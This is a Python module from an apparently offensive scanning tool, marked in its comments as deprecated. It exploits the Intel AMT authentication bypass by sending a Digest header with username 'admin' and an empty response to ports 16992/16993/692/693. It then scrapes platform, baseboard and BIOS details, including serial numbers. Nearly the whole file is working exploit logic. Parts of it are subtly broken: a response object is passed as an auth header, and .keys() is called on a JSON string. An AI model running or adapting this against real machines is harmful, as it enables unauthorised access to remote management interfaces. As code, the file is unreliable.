# Intel AMY bypass scanner is being deprecated and will be completely remove by version 1.3
# the reason for the deprecation is that it serves really no purpose. You will most likely
# not find a vulnerability from a webpage with this attack assessment.
# The code will stay but will be moved to a new folder under etc, that will be called
# deprecated
# TODO:/ move code into deprecated folder

import json
import re
import socket

import requests

import lib.core.settings

from lxml import html
from var.auto_issue.github import request_issue_creation


def __get_auth_headers(target, port, **kwargs):
    """
    get the authorization headers from the URL
    """
    source = kwargs.get("source", None)
    proxy, agent, verbose = kwargs.get("proxy", None), kwargs.get("agent", None), kwargs.get("verbose", False)
    if not source or 'WWW-Authenticate' not in source.headers['WWW-Authenticate']:
        lib.core.settings.logger.info(lib.core.settings.set_color(
            "header value not established, attempting to get bypass..."
        ))
        source = requests.get("http://{0}:{1}/index.htm".format(target, port), timeout=10, headers={
            'connection': 'close', 'user-agent': agent
        }, proxies=proxy)
        return source
    # Get digest and nonce and return the new header
    elif 'WWW-Authenticate' in source.headers:
        lib.core.settings.logger.info(lib.core.settings.set_color(
            "header value established successfully, attempting authentication..."
        ))
        data = re.compile('Digest realm="Digest:(.*)", nonce="(.*)",stale="false",qop="auth"').search(
            source.headers['WWW-Authenticate'])
        digest = data.group(1)
        nonce = data.group(2)
        return 'Digest username="admin", ' \
               'realm="Digest:{0}", nonce="{1}", ' \
               'uri="/index.htm", response="", qop=auth, ' \
               'nc=00000001, cnonce="deadbeef"'.format(digest, nonce)
    else:
        lib.core.settings.logger.info(lib.core.settings.set_color(
            "nothing found, will skip URL..."
        ))
        return None


def __get_raw_data(target, page, port, agent=None, proxy=None, **kwargs):
    """
    collect all the information from an exploitable target
    """
    verbose = kwargs.get("verbose", False)
    lib.core.settings.logger.info(lib.core.settings.set_color(
        "attempting to get raw hardware information..."
    ))
    return requests.get("http://{0}:{1}/{2}.htm".format(target, port, page),
                        headers={
                            'connection': 'close',
                            'Authorization': __get_auth_headers(target, port, verbose=verbose),
                            'user-agent': agent
                        }, proxies=proxy)


def __get_hardware(target, port, agent=None, proxy=None, verbose=False):
    """
    collect all the hardware information from an exploitable target
    """
    req = __get_raw_data(target, 'hw-sys', port, agent=agent, proxy=proxy, verbose=verbose)
    if not req.status_code == 200:
        return None
    lib.core.settings.logger.info(lib.core.settings.set_color(
        "connected successfully getting hardware info..."
    ))
    tree = html.fromstring(req.content)
    raw = tree.xpath('//td[@class="r1"]/text()')
    bios_functions = tree.xpath('//td[@class="r1"]/table//td/text()')
    # find the hardware information
    # and output the hardware data
    # from the raw data found
    data = {
        'platform': {
            'model': raw[0],
            'manufacturer': raw[1],
            'version': raw[2],
            'serial': raw[4],
            'system_id': raw[5]
        },
        'baseboard': {
            'manufacturer': raw[6],
            'name': raw[7],
            'version': raw[8],
            'serial': raw[9],
            'tag': raw[10],
            'replaceable': raw[11]
        },
        'bios': {
            'vendor': raw[12],
            'version': raw[13],
            'date': raw[14],
            'functions': bios_functions
        }
    }
    return json.dumps(data)


def main_intel_amt(url, agent=None, proxy=None, **kwargs):
    """
    main attack method to be called
    """
    do_ip_address = kwargs.get("do_ip", False)
    verbose = kwargs.get("verbose", False)
    proxy = lib.core.settings.proxy_string_to_dict(proxy) or None
    agent = agent or lib.core.settings.DEFAULT_USER_AGENT
    port_list = (16993, 16992, 693, 692)
    if do_ip_address:
        lib.core.settings.logger.warning(lib.core.settings.set_color(
            "running against IP addresses may result in the targets refusing the connection...", level=30
        ))
        lib.core.settings.logger.info(lib.core.settings.set_color(
            "will run against IP address instead of hostname..."
        ))
        try:
            url = lib.core.settings.replace_http(url)
            url = "http://{}".format(socket.gethostbyname(url))
            lib.core.settings.logger.info(lib.core.settings.set_color(
                "discovered IP address {}...".format(url)
            ))
        except Exception as e:
            lib.core.settings.logger.error(lib.core.settings.set_color(
                "failed to gather IP address from hostname '{}', received an error '{}'. "
                "will just run against hostname...".format(url, e), level=40
            ))
            url = url
    lib.core.settings.logger.info(lib.core.settings.set_color(
        "attempting to connect to '{}' and get hardware info...".format(url)
    ))
    for port in list(port_list):
        if verbose:
            lib.core.settings.logger.debug(lib.core.settings.set_color(
                "trying on port {}...".format(port), level=10
            ))
        try:
            json_data = __get_hardware(url, port, agent=agent, proxy=proxy, verbose=verbose)
            if json_data is None:
                lib.core.settings.logger.error(lib.core.settings.set_color(
                    "unable to get any information, skipping...", level=40
                ))
                pass
            else:
                print("-" * 40)
                for key in json_data.keys():
                    print("{}:".format(str(key).capitalize()))
                    for item in json_data[key]:
                        print(" - {}: {}".format(item.capitalize(), json_data[key][item]))
                print("-" * 40)
        except requests.exceptions.ConnectionError as e:
            if "Max retries exceeded with url" in str(e):
                lib.core.settings.logger.error(lib.core.settings.set_color(
                    "failed connection, target machine is actively refusing the connection, skipping...", level=40
                ))
                pass
            else:
                lib.core.settings.logger.error(lib.core.settings.set_color(
                    "failed connection with '{}', skipping...", level=40
                ))
                pass
        except Exception as e:
            if "Temporary failure in name resolution" in str(e):
                lib.core.settings.logger.error(lib.core.settings.set_color(
                    "failed to connect on '{}', skipping...".format(url), level=40
                ))
                pass
            else:
                lib.core.settings.logger.exception(lib.core.settings.set_color(
                    "ran into exception '{}', cannot continue...".format(e), level=50
                ))
                request_issue_creation()
